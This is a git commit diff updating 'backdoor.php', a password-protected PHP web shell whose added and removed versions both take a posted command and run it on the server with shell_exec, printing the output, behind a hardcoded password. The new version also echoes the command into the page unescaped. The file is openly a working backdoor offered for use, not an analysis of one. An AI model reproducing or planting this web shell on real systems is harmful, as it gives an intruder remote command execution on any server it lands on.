7eecd5138710fb14dad5a8ea86b9c92bf7a67c6c
Sornram9254 <sornram9254@yahoo.co.th>
2022-09-30 18:41:15 +0700

    Update backdoor.php

--- backdoor.php
+++ backdoor.php
@@ -1,143 +1,49 @@
-<?php
-// don't remove this
-session_start();
-
-
-
-
-
-
-
-// This is the password 
-// you can change it if u want
-$PASSWD = "S3cr3tp4ssw0rd";
-
-
-
-
-
-
-
-
-
-
-// -----------
-if ($_SESSION['password'] == true)
-{
-	echo "<p></p>";
-}
+<?php # Ref: https://github.com/NullBrunk/WebShell
+session_start();    
+$PASSWD = "P@ssw0rd";
+if ($_SESSION['password'] == true){echo "<p></p>";}
 else{
 	echo '
-	<form action="" method="post">
-	
-	<p> password : <input type="text" name="passw" size="100" rows="100" /> <input type="submit" value="post"></p>
-	
-	</form>';
+	<form action="" method="post" id="login_form"><p> Password : <input type="password" name="passw" size="100" rows="100" autofocus /> <input type="submit" value="Login"></p></form>';
 }
-
-if (isset($_POST['passw'])){
-	if ($_POST['passw'] == $PASSWD){
-		$_SESSION['password'] = true;
-	}
-} 
-
-
+if (isset($_POST['passw'])){if ($_POST['passw'] == $PASSWD){$_SESSION['password'] = true;}} 
 ?>
-
-<!DOCTYPE html>
-<html>
-	<head>
-
-	<title>PHPShell</title>
-	<meta charset="UTF-8" />
-
-	</head>
-	
-		<style>
-				body{
-					color: black;
-					background: black;
-				}
-				a{
-					text-decoration: none;
-					color: #FFF3F3;
-					font-size: 150%
-				}
-
-				p{
-					text-decoration: none;
-					color: white;
-					font-size: 150%
-				}
-
-				fieldset{
-					border:2px solid #FFF3F3;
-					padding:0 20px 20px 20px;
- 					margin-bottom:10px;
-					border-radius:8px;
-				}
-
-				hr{
-
-					height: 1px;
-					background-color: #FFF3F3;
-					
-				}
-
-				input{
-					height: 25px;
-					width: 70px;
-				}
-				input, textarea, select, option {
-					background-color:#FFF3F3;
-				}
-				input, textarea, select {
-					padding:3px;
-					border:1px solid #F5C5C5;
-					border-radius:5px;
-					width:500px;
-					box-shadow:1px 1px 2px #C0C0C0 inset;
-				}
-				select {
-					margin-top:10px;
-				}
-				input[type=submit], input[type=reset] {
-					width:60px;
-					margin-left:5px;
-					box-shadow:1px 1px 1px #D83F3D;
-					cursor:pointer;
-				}
-			</style>
-	<body>
-
-	<fieldset>	
-
-		
-			
-		
+<head><title>PHPShell</title><meta charset="UTF-8" /></head>
+<style>
+    fieldset{padding:0 20px 20px 20px;margin-bottom:10px;border-radius:8px;}
+    input{height: 25px;width: 70px;}
+    input, textarea, select {padding:3px;border-radius:5px;width:500px;}
+    select {margin-top:10px;}
+    input[type=submit], input[type=reset] {width:60px;margin-left:5px;cursor:pointer;}
+    .hidden {display: none;}
+</style>
 <?php
 if ($_SESSION['password'] == true){
-	echo 
-	'<form action="" method="post">
-	<p> <input type="text" name="command" size="100" rows="100" /> <input type="submit" value="execute"></p>
+    echo '<script>
+        document.getElementById("login_form").style.display = "none";
+        document.getElementById("cmd").focus();
+        function cpLastCmd() {
+            var copyText = document.getElementById("lastCmd");
+            navigator.clipboard.writeText(copyText.textContent);
+            document.getElementById("COPIED").style.display = "block";
+            setTimeout(function(){
+                document.getElementById("COPIED").style.display = "none";
+            },2000)
+        }
+    </script>
+	<form action="" method="post">
+	<p><input type="text" name="command" id="cmd" size="100" rows="100" autofocus /> <input type="submit" value="execute"></p>
 	</form>
 	<hr>
 	';
 	if (isset($_POST['command'])) 
 		{
 			$command = $_POST['command'];
+            echo "Last command used : <b style='color:red' id='lastCmd' onclick='cpLastCmd()'>$command</b>";
+            echo "<div class='COPIED' id='COPIED' name='COPIED' style='color:blue;display:none;'>Successfully copied</div>";
 			echo "<a><pre>".shell_exec($command)."</pre></a>";
 		}
-		else{
-			echo "<p>No command specified</p>";
-		}
+		else{echo "<p>No command specified</p>";}
 }
-else{
-	echo "<p>Please enter the password</p>";
-}
-
+else{echo "<p>Please enter the password</p>";}
 ?>
-
-</fieldset>
-	<body>
-</html>
